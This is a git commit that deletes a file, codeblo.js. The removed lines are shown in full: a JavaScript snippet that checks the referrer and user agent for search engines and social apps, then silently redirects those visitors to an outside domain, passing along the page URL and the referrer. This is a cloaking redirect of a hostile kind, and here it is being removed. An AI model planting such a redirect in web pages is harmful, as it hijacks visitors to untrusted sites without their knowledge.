fbd429d93aabb388da7d83194770892a0cea6a3f
syarifulanam19-hana <syarifulanam19@gmail.com>
2026-01-18 01:15:21 +0700

    Delete codeblo.js

--- codeblo.js
+++
@@ -1,5 +0,0 @@
-  //<![CDATA[
-var ars = 'https://njepat.xyz';
-
-if(['android-app', 'com.pinterest','.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['android-app','fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-//]]>
